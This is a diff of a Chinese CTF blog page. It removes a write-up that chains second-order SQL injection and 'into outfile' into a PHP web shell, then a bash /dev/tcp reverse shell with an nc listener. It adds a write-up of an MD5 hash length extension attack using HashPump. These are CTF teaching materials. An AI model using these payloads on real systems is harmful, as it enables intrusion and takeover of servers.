@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Web,">
+  <meta name="keywords" content="基础,">
 
 
 
@@ -81,20 +81,18 @@
 
 
 
-<meta name="description" content="黑白盒复现(补招新题)招新赛的时候没做这道题，前几天听止痒学长讲完之后觉得里面有很多知识点没有了解过，复现的时候也出现了问题，所以把完整的步骤和其中涉及的知识点整理出来吧。   首先我们可以看到界面中只有登陆和注册可以打开，可能会存在sql注入，同时在头像处可以上传文件，又可能存在文件上传漏洞。 文件上传漏洞分类1、上传文件是PHP、JSP、ASP等脚本代码，服务器的Web容器解释并执行了用户上传">
-<meta name="keywords" content="Web">
+<meta name="description" content="Hash长度扩展攻击&amp;lt;?php  //$flag and $secret in flag.php and strlen($secret)==15 include(&amp;quot;flag.php&amp;quot;); if(!isset($_POST[&amp;apos;username&amp;apos;])){show_source(__FILE__);die();} $username = $_POST[&amp;qu">
+<meta name="keywords" content="基础">
 <meta property="og:type" content="article">
-<meta property="og:title" content="黑白盒">
-<meta property="og:url" content="http://yoursite.com/2018/11/29/黑白盒/index.html">
+<meta property="og:title" content="Hash长度扩展攻击">
+<meta property="og:url" content="http://yoursite.com/2019/07/27/Hash长度扩展攻击/index.html">
 <meta property="og:site_name" content="木偶&#39;s blog">
-<meta property="og:description" content="黑白盒复现(补招新题)招新赛的时候没做这道题，前几天听止痒学长讲完之后觉得里面有很多知识点没有了解过，复现的时候也出现了问题，所以把完整的步骤和其中涉及的知识点整理出来吧。   首先我们可以看到界面中只有登陆和注册可以打开，可能会存在sql注入，同时在头像处可以上传文件，又可能存在文件上传漏洞。 文件上传漏洞分类1、上传文件是PHP、JSP、ASP等脚本代码，服务器的Web容器解释并执行了用户上传">
+<meta property="og:description" content="Hash长度扩展攻击&amp;lt;?php  //$flag and $secret in flag.php and strlen($secret)==15 include(&amp;quot;flag.php&amp;quot;); if(!isset($_POST[&amp;apos;username&amp;apos;])){show_source(__FILE__);die();} $username = $_POST[&amp;qu">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2018/11/29/黑白盒/1.png">
-<meta property="og:updated_time" content="2018-11-29T01:24:24.324Z">
+<meta property="og:updated_time" content="2019-07-27T13:51:16.488Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="黑白盒">
-<meta name="twitter:description" content="黑白盒复现(补招新题)招新赛的时候没做这道题，前几天听止痒学长讲完之后觉得里面有很多知识点没有了解过，复现的时候也出现了问题，所以把完整的步骤和其中涉及的知识点整理出来吧。   首先我们可以看到界面中只有登陆和注册可以打开，可能会存在sql注入，同时在头像处可以上传文件，又可能存在文件上传漏洞。 文件上传漏洞分类1、上传文件是PHP、JSP、ASP等脚本代码，服务器的Web容器解释并执行了用户上传">
-<meta name="twitter:image" content="http://yoursite.com/2018/11/29/黑白盒/1.png">
+<meta name="twitter:title" content="Hash长度扩展攻击">
+<meta name="twitter:description" content="Hash长度扩展攻击&amp;lt;?php  //$flag and $secret in flag.php and strlen($secret)==15 include(&amp;quot;flag.php&amp;quot;); if(!isset($_POST[&amp;apos;username&amp;apos;])){show_source(__FILE__);die();} $username = $_POST[&amp;qu">
 
 
 
@@ -124,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/11/29/黑白盒/">
+  <link rel="canonical" href="http://yoursite.com/2019/07/27/Hash长度扩展攻击/">
 
 
 
 
 
-  <title>黑白盒 | 木偶's blog</title>
+  <title>Hash长度扩展攻击 | 木偶's blog</title>
   
 
 
@@ -300,7 +298,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/29/黑白盒/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/Hash长度扩展攻击/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="木偶">
@@ -317,7 +315,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">黑白盒</h1>
+          <h1 class="post-title" itemprop="name headline">Hash长度扩展攻击</h1>
         
 
         <div class="post-meta">
@@ -329,8 +327,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-29T09:12:31+08:00">
-                2018-11-29
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-27T18:19:26+08:00">
+                2019-07-27
               </time>
             
 
@@ -352,8 +350,8 @@
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web复现/" itemprop="url" rel="index">
-                    <span itemprop="name">Web复现</span>
+                  <a href="/categories/基础/" itemprop="url" rel="index">
+                    <span itemprop="name">基础</span>
                   </a>
                 </span>
 
@@ -370,8 +368,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2018/11/29/黑白盒/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2018/11/29/黑白盒/" itemprop="commentCount"></span>
+                <a href="/2019/07/27/Hash长度扩展攻击/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/07/27/Hash长度扩展攻击/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -393,7 +391,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.7k 字
+                  934 字
                 </span>
               
 
@@ -409,7 +407,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  6 分钟
+                  3 分钟
                 </span>
               
             </div>
@@ -430,37 +428,66 @@
       
 
       
-        <h1 id="黑白盒复现-补招新题"><a href="#黑白盒复现-补招新题" class="headerlink" title="黑白盒复现(补招新题)"></a>黑白盒复现(补招新题)</h1><p>招新赛的时候没做这道题，前几天听止痒学长讲完之后觉得里面有很多知识点没有了解过，复现的时候也出现了问题，所以把完整的步骤和其中涉及的知识点整理出来吧。  </p>
-<p>首先我们可以看到界面中只有登陆和注册可以打开，可能会存在sql注入，同时在头像处可以上传文件，又可能存在文件上传漏洞。</p>
-<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>1、上传文件是PHP、JSP、ASP等脚本代码，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行；</p>
-<p>2、上传文件是crossdomain.xml，导致可以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似);</p>
-<p>3、上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行植入到pc中。</p>
-<p>4、上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。<br><a id="more"></a><br>在大多数情况下，文件上传漏洞一般都是指“上传的Web脚本被服务器解析从而获取网站shell权限”，也就是webshell，要完成上传漏洞攻击需要满足以下几个条件:</p>
-<p>1、上传的文件能够被Web容器解释执行，所以文件上传后所在的目录需要解析器可以执行目录下的文件，也就是说文件目录必须在web容器覆盖路径内才行。</p>
-<p>2、用户可以直接通过浏览器进行访问这个shell文件，如果web容器不能解析这个文件，那么也不能算是漏洞。</p>
-<p>3、最后，上传的shell文件如果被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。<br>(来源：看雪)</p>
-<h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>在图片上传上我们看到上传图片的地址已知，访问地址可以看到我们上传上去的图片，所以我们可以利用SQL写入一句话getshell，再反弹shell从服务器中拿到flag。</p>
-<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>网站对我们输入的一些关键字符进行了转义，但在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了该数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。  </p>
-<p>在注册用户名时我们发现当我们的用户名为 1’ 时 登陆后显示的是 1\’ 所以网页对’进行了转义，但当我们在查看用户信息时我们的user_name<br>显示为 1’ 所以说明我们的用户名已经被存储在数据库之中，并且从数据库中提取出来不会存在转义，这就造成了一个二次注入。</p>
-<h4 id="Into-outfile"><a href="#Into-outfile" class="headerlink" title="Into outfile"></a>Into outfile</h4><p>导出数据到pc的指定目录下。<br>在一开始的图片文件上传的时候我们看到存在/var/www/html/favicon/xxx可以读取和查看文件，所以我们将一句话写入这个地方<br>/var/www/html/一般为网站的根目录</p>
-<h4 id="注册-lt-php-GET-x-gt"><a href="#注册-lt-php-GET-x-gt" class="headerlink" title="注册&lt;?php $_GET[x];?&gt;"></a>注册&lt;?php <code>$_GET[x]</code>;?&gt;</h4><p>&lt;?php <code>$_GET[x]</code>;?&gt; PHP中反引号 <code></code> 的作用是把反引号中的内容当做Shell命令执行，我们可以在新创建的的网页上传入变量x值来执行我们想要目标主机执行的命令，注册该用户可以将&lt;?php <code>$_GET[x]</code>;?&gt;写入数据库</p>
-<h4 id="注册-lt-php-GET-x-gt-’into-outfile’-var-www-html-favicon-4-php"><a href="#注册-lt-php-GET-x-gt-’into-outfile’-var-www-html-favicon-4-php" class="headerlink" title="注册&lt;?php $_GET[x];?&gt;’into outfile’/var/www/html/favicon/4.php"></a>注册&lt;?php <code>$_GET[x]</code>;?&gt;’into outfile’/var/www/html/favicon/4.php</h4><p>将&lt;?php <code>$_GET[x]</code>;?&gt;从数据库中提取出来并导出到favicon/4.php<br>此时在4.php中我们就可以通过变量x来上传我们想让目标主机执行的shell命令了</p>
-<h4 id="bash-c-“bash-i-gt-amp-dev-tcp-9999-0-lt-amp-1-2-gt-amp-1”"><a href="#bash-c-“bash-i-gt-amp-dev-tcp-9999-0-lt-amp-1-2-gt-amp-1”" class="headerlink" title="bash -c “bash -i &gt;&amp; /dev/tcp//9999 0&lt;&amp;1 2&gt;&amp;1”"></a>bash -c “bash -i &gt;&amp; /dev/tcp/<your-server-ip>/9999 0&lt;&amp;1 2&gt;&amp;1”</your-server-ip></h4><p>首先，bash -c 就是运行shell脚本 bash -i是打开一个交互的bash，/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。<br>要想了解“&gt;&amp;”、“0&gt;&amp;1”和2&gt;&amp;1，首先我们要先了解一下Linux文件描述符和重定向。</p>
-<p>linux shell下常用的文件描述符是：</p>
-<ol>
-<li><p>标准输入   (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； </p>
-</li>
-<li><p>标准输出   (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； </p>
-</li>
-<li><p>标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。</p>
-</li>
-</ol>
-<p>&amp;可以理解为c语言中的取地址符（n&lt;&amp;word 是把word复制给n，n&gt;&amp;word是把word复制给n。）2&gt;&amp;1是将标准错误输出合并到标准输出中，&amp;&gt;是将标准错误输出定向到标准输出中。也就是输出标准输出的同时也会输出标准错误输出。这句话的意思创建一个可交互的bash和一个到xxx.xxx.xxx.xxx的TCP链接，然后将bash的输入输出错误都重定向到在xxx.xxx.xxx.xxx监听的进程。简单来说就是A主机可以通过执行B主机上的命令并且把返回值都返回到A上。</p>
-<h5 id="这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell-复现的时候就在这出了问题，菜的真实…"><a href="#这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell-复现的时候就在这出了问题，菜的真实…" class="headerlink" title="这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell(复现的时候就在这出了问题，菜的真实….)"></a>这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell(复现的时候就在这出了问题，菜的真实….)</h5><p>之后再服务器开启监听 nc -lvnp 9999  </p>
-<p>现在我们之前所传的一句话就派上了用场，在4.php的地址后构造?x=bash%20-c%20%22bash%20-i%20%3E%26%20%2fdev%2ftcp/<your-server-ip>/9999 0%3C%26%202%3E%261%22 就可以让目标主机执行这个命令  </your-server-ip></p>
-<h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>A主机开启9999端口的tcp服务<br>B主机连接到A主机的9999的tcp服务<br>A主机通过tcp服务把命令发到B主机<br>B主机读取命令并且在bash中执行<br>B主机把执行结果发给A主机</p>
-<p>拿到shell之后就可以 cd / 进入主目录，主目录中存在包含flag的文件<br><img src="/2018/11/29/黑白盒/1.png" alt=" "><br>cat读取文件就可以拿到flag</p>
+        <h2 id="Hash长度扩展攻击"><a href="#Hash长度扩展攻击" class="headerlink" title="Hash长度扩展攻击"></a>Hash长度扩展攻击</h2><pre><code>&lt;?php 
+//$flag and $secret in flag.php and strlen($secret)==15
+include(&quot;flag.php&quot;);
+if(!isset($_POST[&apos;username&apos;])){show_source(__FILE__);die();}
+$username = $_POST[&quot;username&quot;];
+$password = $_POST[&quot;password&quot;];
 
+    if (!empty($_COOKIE[&quot;getmein&quot;])) {
+
+    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) {
+    if ($_COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {
+        echo &quot;Congratulations! You are a registered user.\n&quot;;
+        die (&quot;The flag is &quot;. $flag);
+    }
+    else {
+        die (&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;);
+    }
+}
+else {
+    die (&quot;You are not an admin! LEAVE.&quot;);
+}
+}
+
+setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));
+
+if (empty($_COOKIE[&quot;source&quot;])) {
+    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));
+}
+else {
+if ($_COOKIE[&quot;source&quot;] != 0) {
+    echo &quot;&quot;; // This source code is outputted here
+}
+}
+</code></pre><p>很早之前蓝鲸ctf的时候就遇到了hash扩展长度攻击的问题，当时没有整理，趁把这道题放夏令营的时候整理一下</p>
+<p>我们已知的是：  </p>
+<pre><code>md5($secret.adminadmin)= 2aba05712564dde4fb15fdb5f0e0de66;
+以及$secret的长度为15；  
+</code></pre><p>我们要得到的是如何构造一个$password让</p>
+<pre><code>md5($secret . urldecode($username . $password)))已知，并构造cookie；  
+</code></pre><p>此处我们并不知道$secret的值是什么，password又不能等于admin，所以我们需要用到hash长度扩展攻击；相当于是现在我们不知道字符串是什么。只知道其长度，通过hash长度拓展攻击，我们可以得到在原字符串的基础上进行了补位以及添加新字符串的hash值</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>首先，当hash函数拿到需要被hash的字符串后，先将其字节长度整除64，取得余数。如果该余数正好等于56，那么就在该字符串最后添加上8个字节的长度描述符（具体用bit表示）。如果不等于56，就先对字符串进行长度填充，填充时第一个字节为hex(80)，其他字节均用hex(00)填充，填充至余数为56后，同样增加8个字节的长度描述符（该长度描述符为需要被hash的字符串的长度，不是填充之后整个字符串的长度）。以上过程，称之为补位。</p>
+<p>补位完成后，字符串以64位一组进行分组（因为上面的余数为56,加上8个字节的长度描述符后，正好是64位，凑成一组）。字符串能被分成几组就会进行多少次“复杂的数学变化”。每次进行“复杂的数学变化”都会生成一组新的registers值供下一次“复杂的数学变化”来调用。第一次“复杂的数学变化”会调用程序中的默认值。当后面已经没有分组可以进行数学变化时，该组生成的registers值就是最后的hash值。</p>
+<p>（原理原文链接：<a href="http://www.freebuf.com/articles/web/69264.html）" target="_blank" rel="noopener">www.freebuf.com/articles/web/69264.html）</a></p>
+<p>也就是说我们先对$secret.adminadmin进行补位，然后添加一个新的字符串，用补位完成后那个分组生成的register值对新添加的字符串进性运算得到最后的hash值，而补位完成后那个分组的register值和我们已知的md5($secret.adminadmin)值相等。</p>
+<h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><p>HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响。</p>
+<p>安装</p>
+<pre><code>git clone https://github.com/bwall/HashPump
+apt-get install g++ libssl-dev
+cd HashPump
+make
+make install
+</code></pre><p>所需数据</p>
+<pre><code>root@ubuntu:~/HashPump# hashpump
+Input Signature: 2aba05712564dde4fb15fdb5f0e0de66//hash值
+Input Data: adminadmin//加密的明文
+Input Key Length: 15//key长度
+Input Data to Add: 1
+286d5b319a75f5f498dac9a52dcb360e//新生成的md5也就是getmein
+adminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x001//admin.$passowrd
+</code></pre>
       
     </div>
     
@@ -477,7 +504,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Web/" rel="tag"># Web</a>
+            <a href="/tags/基础/" rel="tag"># 基础</a>
           
         </div>
       
@@ -490,8 +517,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/11/19/同源策略/" rel="next" title="同源策略">
-                <i class="fa fa-chevron-left"></i> 同源策略
+              <a href="/2019/07/11/Dockerfile搭建简单Web题目/" rel="next" title="Dockerfile搭建简单Web题目">
+                <i class="fa fa-chevron-left"></i> Dockerfile搭建简单Web题目
               </a>
             
           </div>
@@ -499,10 +526,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/12/01/xss跨站脚本攻击-1/" rel="prev" title="xss跨站脚本攻击(1)">
-                xss跨站脚本攻击(1) <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -718,7 +741,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#黑白盒复现-补招新题"><span class="nav-number">1.</span> <span class="nav-text">黑白盒复现(补招新题)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#文件上传漏洞"><span class="nav-number">1.0.1.</span> <span class="nav-text">文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#分类"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">分类</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Getshell"><span class="nav-number">1.1.</span> <span class="nav-text">Getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#二次注入"><span class="nav-number">1.1.1.</span> <span class="nav-text">二次注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Into-outfile"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">Into outfile</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注册-lt-php-GET-x-gt"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">注册&lt;?php $_GET[x];?&gt;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注册-lt-php-GET-x-gt-’into-outfile’-var-www-html-favicon-4-php"><span class="nav-number">1.1.1.3.</span> <span class="nav-text">注册&lt;?php $_GET[x];?&gt;’into outfile’/var/www/html/favicon/4.php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bash-c-“bash-i-gt-amp-dev-tcp-9999-0-lt-amp-1-2-gt-amp-1”"><span class="nav-number">1.1.1.4.</span> <span class="nav-text">bash -c “bash -i &gt;&amp; /dev/tcp//9999 0&lt;&amp;1 2&gt;&amp;1”</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell-复现的时候就在这出了问题，菜的真实…"><span class="nav-number">1.1.1.4.1.</span> <span class="nav-text">这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell(复现的时候就在这出了问题，菜的真实….)</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#原理"><span class="nav-number">1.1.1.4.1.1.</span> <span class="nav-text">原理</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Hash长度扩展攻击"><span class="nav-number">1.</span> <span class="nav-text">Hash长度扩展攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理"><span class="nav-number">1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hashdump"><span class="nav-number">1.2.</span> <span class="nav-text">hashdump</span></a></li></ol></li></ol></div>
             
 
           </div>
